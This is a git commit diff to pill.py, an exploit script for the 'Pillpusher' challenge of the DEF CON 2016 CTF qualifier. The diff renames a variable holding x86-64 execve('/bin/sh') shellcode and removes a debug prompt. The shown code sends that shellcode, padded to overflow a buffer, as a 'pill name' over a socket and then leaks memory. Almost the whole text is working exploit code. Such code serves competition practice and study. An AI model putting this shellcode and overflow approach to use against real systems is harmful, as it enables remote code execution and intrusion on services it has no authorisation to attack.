c4a2445a9a21c0e70bafc470ee9a128612886a9c
Junwoo Byun <ch1m@ch1mac.com>
2016-05-26 09:23:06 +0900

    Update pill.py

--- 2016/Defcon/Pillpusher/pill.py
+++ 2016/Defcon/Pillpusher/pill.py
@@ -3,11 +3,8 @@ from ch1mac import *
 s = SockCon("10.211.55.4",31337,100)
 #s = SockCon("pillpusher_a3b929dac1a7ca27fe5474bae0432262.quals.shallweplayaga.me",43868,100)
 
-raw_input("fuck")
-
 pill_name = "A"*0xFC+"\n"
-
-fufu = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
 
 RD(s,"-> ")
 s.send("2\n")
@@ -15,7 +12,7 @@ RD(s,"-> ")
 s.send("1\n") #add pill
 
 RD(s,"Pill Name: ")
-s.send(fufu.ljust(0x100,"A")+"\n")
+s.send(shellcode.ljust(0x100,"A")+"\n")
 RD(s,"Dosage: ")
 s.send("0\n")
 RD(s,"Schedule: ")
@@ -29,7 +26,7 @@ s.send("Cat\n\n")
 
 RD(s,"-> ")
 s.send("3\n")
-print RD(s,fufu.ljust(0x100,"A"))
+print RD(s,shellcode.ljust(0x100,"A"))
 tmp = RD(s,"\n")[:-1]
 hexdump(tmp)
 tmp = tmp.ljust(8,"\x00")
